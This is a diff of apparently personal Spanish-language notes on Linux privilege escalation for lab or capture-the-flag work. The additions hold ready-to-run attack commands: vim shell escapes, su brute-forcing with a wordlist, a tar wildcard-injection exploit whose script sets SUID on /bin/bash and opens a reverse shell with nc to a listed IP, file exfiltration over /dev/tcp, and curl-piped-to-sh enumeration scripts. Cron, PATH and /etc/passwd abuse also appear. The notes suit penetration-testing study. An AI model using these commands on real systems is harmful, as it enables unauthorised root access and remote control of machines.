@@ -2,8 +2,35 @@
 -------
 >Una vez he ganado acceso
 -----
->
+## Si tenemos opción de meternos a un manual
+
+```bash
+:!/bin/bash
+:/bin/bash
+! shell /bin/bash 
+:set shell=/bin/bash
+:shell
+```
+## env
+
+- Ver si hay una password o algo leakeado
+```bash
+env
+history
+```
+
+## Bruteforcing su root
+
+> Una vez ganamos acceso y por ningún lado encontramos o podemos subir privs con **sudo -l -l**
+
+- Encufamos este [Herramienton-suforce](https://github.com/d4t4s3c/suForce) desde la máquina victima, nos pasamos el **rockyou** con esta technique --> [[Elevación de privilegios#Detección y explotación de tareas Cron]]
+```bash
+./suForce -u <USER> -w <WORDLIST>
+```
+## Python
+
 >Si python tiene SUID perms, ejecutamos
+
 
 ```bash
 python3
@@ -43,6 +70,11 @@ export SHELL=bash
 stty rows loquemedigamiterminal columns loquemedigamiterminal # en la revshell
 ```
 
+- Tratamiento con python
+```bash
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
+
 ## Abusando de Privilegios SUID - Set User ID
 ----
 >Buscaremos los archivos o binarios que tenga este permiso especial pare ejecutar como root este mismo binario encontrado y **tratar de leer archivos o alguna acción más intrusiva**, ten pensamiento lateral con ese comando
@@ -52,12 +84,14 @@ stty rows loquemedigamiterminal columns loquemedigamiterminal # en la revshell
 
 > Commands Para **SUID** para **SGID**
 ```bash
-SUID
+# SUID
 find / -perm -4000 -ls 2>/dev/null
-SGID
+# SGID
 find / -perm -4000 -o -perm -2000 -exec ls -ld {} \; 2>/dev/null
-AMBOS
+# AMBOS
 ls -alh /path/to/check | grep 's'
+# Buscar archivos de un user
+find / -user www-data -ls 2>/dev/null | grep -E -v -i 'run|sys|dev|proc'
 ``` 
 
 ```
@@ -95,11 +129,39 @@ nc -nlvp 443 > pspy
 ```
 - Atacante Publico el archivo pspy
 ```bash
-cat > /dev/tcp/192.168.1.135/443 < /usr/local/bin/pspy
-nc 192.168.1.135 443 < /usr/local/bin/pspy
+cat > /dev/tcp/IPVIctima/443 < /usr/local/bin/pspy
+nc IPVictima 443 < /usr/local/bin/pspy
+```
+-----
+#### SI veo esto con **pspy**
+```bash
+```txt
+D=0     PID=607    | /usr/sbin/CRON -f 
+2023/08/12 13:41:01 CMD: UID=0     PID=608    | /bin/sh -c cd /var/www/html && tar -zcf /var/backups/serve.tgz * 
+2023/08/12 13:41:01 CMD: UID=0     PID=609    | tar -zcf /var/backups/serve.tgz index.html 
+2023/08/12 13:41:01 CMD: UID=0     PID=610    | /bin/sh -c gzip
 ```
 
+Se puede obtener el root mediante la colocación de archivos maliciosos aprovechando el manejo de comodines de la siguiente forma:
 
+```txt
+tony@plot:/var/www/html$ touch -- "--checkpoint=1"
+tony@plot:/var/www/html$ touch -- "--checkpoint-action=exec=sh script.sh"
+```
+
+> El primer comando crea un archivo con el nombre `--checkpoint=1`, activando un modo especial de **tar** que simula la creación de un archivo de respaldo. El segundo comando crea un archivo llamado `--checkpoint-action=exec=sh script.sh`, lo que hace que **tar** ejecute `script.sh` como el usuario root.
+
+Ahora creo el archivo `script.sh`, le doy permisos de ejecución y le añado lo siguiente:
+
+```bash
+#!/bin/bash
+
+chmod 4775 /bin/bash
+chmod u+s /bin/bash
+nc -c /bin/bash 192.168.1.18 1337
+```
+
+----
 Script para **ver que comandos se ejecutan en tiempo real**, en el output al ejecutarlo tenemos lo siguiente
 
 >**<**: Sirve para ver que comando ya no se está ejecutando
@@ -143,7 +205,7 @@ done
 
 ## PATH Hijacking
 
-> Nos aprovechamos de un binario que está en el **$PATH** con la ruta relativa d eun comando que haya dentro como **system("whoami");** del Código en ***C***
+> Nos aprovechamos de un binario que está en el **$PATH** con la ruta relativa de un comando que haya dentro como **system("whoami");** del Código en ***C***
 
 - Instalamos el paquete **gcc** para hacer el binario en #C
 - Hacemos este binario en C para abusar de él
@@ -229,7 +291,7 @@ sudo -u toni python3 /tmp/elscriptquehayprimero.py
 `openssl passwd` --> nos saca hash
 - Encontrar Archivos editables con el **current user**
 ```bash
-find / -writeable 2>/dev/null | grep -vE "cadenaquenoqueremos|proc"
+find / -writable 2>/dev/null | grep -vE "run|sys|dev|proc"
 ```
 - **/etc/passwd**
 `user:hash.:0:0:root:/root:/bin/bash`
@@ -237,7 +299,7 @@ find / -writeable 2>/dev/null | grep -vE "cadenaquenoqueremos|proc"
 - Ver qué ejecuta el crontab
 `***** horas.sh`
 
->Si el script horas.sh está en el directorio perosnal de un usuario sin privilegios, aunque no tega permisos de ecición, se puede borrar y crear uno nuevo que nosotros queramos jiji 😁
+>Si el script horas.sh está en el directorio perosnal de un usuario sin privilegios, no tengo permisos de escritura, sin embargo se puede borrar y crear uno nuevo que nosotros queramos jiji 😁
 
 - En directorio personal del user, como **la tarea la ejecuta root desde crontab**, pues zas zas
 ```bash
@@ -248,7 +310,7 @@ nano hola.sh
 chmod u+s /bin/bash
 ```
 
-- Ejecutables para abusar de tu madre, digo de permisos suculentos
+- Ejecutables para abusar de tu madre o de permisos suculentos
 
 1. [LSE](https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh)
 ```bash
@@ -262,6 +324,8 @@ curl "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/d
 2. [LinPEAS](https://github.com/Keartland/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) Leer su github que bypassea ANtiVirus
 ```bash
 curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
+# O
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ```
 
 ## Detección y explotación de Capabilities
@@ -276,7 +340,9 @@ curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-
 
 - El recurso **/proc/pid_process/status** arroja info y podemos ver capabilities 
 
-```bahs
+```bash
+/usr/sbin/getcap -r / 2>/dev/null
+
 toni@24c05775669f:/home$ cat /proc/1/status | grep -Fi "cap"
 CapInh: 0000000000000000
 CapPrm: 00000000a80425fb
@@ -407,6 +473,7 @@ bash -p
 ```bash
 netstat -nat
 netstat -putan
+ss -tln
 ```
 
 - Desde la url vemos un **cmd.php**, abrimos otro puerto y puede ser que ese archivo que lo ejecute como root, o incluso podemos borrar ese archivo y crea runo con el mismo nombre qu enos de una cmd, **pero gracias a crontab lo ejecute root**
